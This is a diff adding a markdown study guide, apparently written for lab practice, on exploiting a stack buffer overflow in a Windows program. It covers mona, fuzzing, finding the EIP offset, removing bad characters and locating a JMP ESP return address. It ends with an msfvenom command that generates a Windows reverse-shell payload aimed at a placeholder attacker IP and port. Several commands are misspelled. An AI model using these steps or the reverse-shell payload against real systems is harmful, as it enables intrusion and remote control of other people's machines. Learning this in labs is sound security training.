@@ -1,0 +1,89 @@
+# How to Buffer Over flow
+
+## Mona config
+
+First run the application in Immunity debugger
+then configure the mona 
+
+``!mona config -set workingfolder c:\mona\%p``
+***
+## Fuzzing
+
+After configuring mona do fuzzing using the fuzzing script 
+To see where the application get crashed (At what bytes the program stops responding)
+
+After we run the fuzzer we have an idea at how many bytes the program crash OR How many byte a program input can take
+
+For exaple the program crash at 2000 bytes
+
+After getting a idea of at how many bytes the program crashes we can find the offset or exactly at how many bytes the program crashes and after what number the EIP get Over-written
+Using the exploit script
+
+>FInding the EIP overwritten numebr
+
+We need to do some modification like :
+:FIRST:
+``use patern_create -l CHar``
+to create a patern to find the exact number
+
+We need to paste the output of Patern_Create to the exploi.py at `payload` variable
+
+TO get the Number at which eIP get written
+### USing msf
+``use patern_offset -q char``
+to analyse the patern created and get the number at which the EIP got over-written
+
+### Using mona 
+
+after running the exploit.py using the patern_create as payload (the program sould crash)
+use the below command to get the number at which EIP is written
+
+``!mona findmsp -distance Number_of_char``
+
+after getting the offset number for example 1987
+put that into the exploit.py in the `offset` field
+***
+## FInding Badcharacters
+
+run the badchar.py and paste the output in `payload` in exploit.py
+add `retn` BBBB
+
+after crashing the app again
+
+right click on the `ESP` register and follow in dump 
+manually see  the hex dump to find the bad char
+
+>using mona
+
+to generate a bytearray except the badchar
+```!mona bytearray -b "badchar"```  #\x00
+
+to see all the badchar using mona
+```!mona compare -f path\to\the\file -a ESP address```
+
+now manually add the result badchar to the !mona bytearray 
+
+DO this till the mona compare say unmodified
+
+
+### To find the jump point
+
+``!mona jmp -r esp -cpb "badchar"``
+
+After running this command you will get all the possible JUMP ESP address to set the breakpoint
+and then put the address in reverse order in Exploit.py in `retn` variable for example `625011af ---> af115062/ \xaf\x11\x50\x61`
+and remove the `payload` which are  all the char
+
+>TO get The reverse shell
+
+Generate a payload for reverse_shell
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port_numeber EXITFUNC=thread -b "All_the_bad_char" -f FOrmate (c/py)
+```
+and pasete the output in `payload` feild/variable
+
+andd 16 nops/ `padding`
+```"\x90" *16```
+
+
+
